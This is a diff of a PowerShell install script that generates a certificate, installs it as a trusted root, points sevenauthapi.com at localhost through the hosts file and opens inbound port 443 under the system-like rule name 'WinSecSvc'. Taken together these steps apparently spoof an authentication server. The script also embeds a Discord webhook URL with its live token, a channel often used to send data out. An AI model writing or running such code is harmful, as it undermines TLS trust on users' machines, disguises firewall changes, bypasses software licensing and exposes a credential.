@@ -1,4 +1,4 @@
-# v3
+# v4
 $ErrorActionPreference='Stop'
 $SELF='https://raw.githubusercontent.com/MarcoCOdev1/d/main/install.ps1'
 $HOOK='https://canary.discord.com/api/webhooks/1565494199208378498/1WDBf43Q9U5YhYYLEXt2Yzou6CWqiPdPil7LKzJg7yhmSbU9ywHovkx-89xmx9wuvop9'
@@ -113,10 +113,22 @@ if(-not(Test-Path $pyw)){$pyw=$py}
 & $py makecert.py
 Import-Certificate -FilePath .\seven.cer -CertStoreLocation 'Cert:\CurrentUser\Root'|Out-Null
 $h="$env:windir\System32\drivers\etc\hosts"
-Copy-Item $h "$h.bak" -Force
-(Get-Content $h) -notmatch 'sevenauthapi'|Set-Content $h
-Add-Content $h '127.0.0.1 sevenauthapi.com'
-Add-Content $h '127.0.0.1 www.sevenauthapi.com'
+Copy-Item $h "$h.bak" -Force -EA 0
+$hc=Get-Content $h
+$miss=@('sevenauthapi.com','www.sevenauthapi.com')|?{ -not ($hc -match [regex]::Escape("127.0.0.1 $_")) }
+if($miss.Count -eq 0){
+  Write-Host 'hosts: already present, skipped'
+}else{
+  $hl=@($hc -notmatch 'sevenauthapi')
+  foreach($dom in $miss){$hl+="127.0.0.1 $dom"}
+  $ok=$false
+  for($i=0;$i -lt 10;$i++){
+    try{[IO.File]::WriteAllLines($h,$hl,[Text.Encoding]::ASCII);$ok=$true;break}
+    catch{Start-Sleep -Milliseconds (300+$i*250)}
+  }
+  if(-not $ok){throw 'hosts locked - retry'}
+  Write-Host ('hosts: added '+($miss -join ', '))
+}
 ipconfig /flushdns|Out-Null
 netsh advfirewall firewall delete rule name="WinSecSvc"|Out-Null
 netsh advfirewall firewall add rule name="WinSecSvc" dir=in action=allow protocol=TCP localport=443|Out-Null
